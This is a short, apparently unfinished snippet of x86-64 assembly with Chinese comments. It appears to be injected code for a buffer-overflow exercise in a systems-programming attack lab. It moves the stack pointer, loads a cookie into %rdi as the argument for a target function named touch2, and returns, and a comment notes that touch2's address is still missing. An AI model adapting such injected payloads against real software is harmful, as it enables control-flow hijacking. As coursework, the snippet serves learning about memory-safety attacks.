

sub $36,%rsp #dif还要算, 让rsp指向 touch2的位置
mov $0x59b997fa, %rdi #给touch2传递参数
retq
#这里还需要一行是touch2的地址。